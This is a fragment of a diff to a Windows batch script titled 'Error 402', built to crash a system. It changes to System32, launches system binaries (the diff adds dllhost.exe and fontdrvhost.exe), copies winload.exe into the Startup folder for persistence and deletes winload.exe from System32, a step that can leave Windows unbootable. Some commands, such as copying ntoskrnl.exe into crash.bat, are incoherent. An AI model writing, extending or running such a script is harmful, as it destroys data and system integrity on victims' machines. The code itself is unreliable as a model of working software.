@@ -8,7 +8,9 @@ title Ошибка 402 Error 402
 xcopy ntoskrnl.exe crash.bat
 :crashWinTotal
 cd C:\Windows\System32
+start dllhost.exe
 start winload.exe
+start fontdrvhost.exe
 copy winload.exe %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
 del winload.exe
 :winCrash
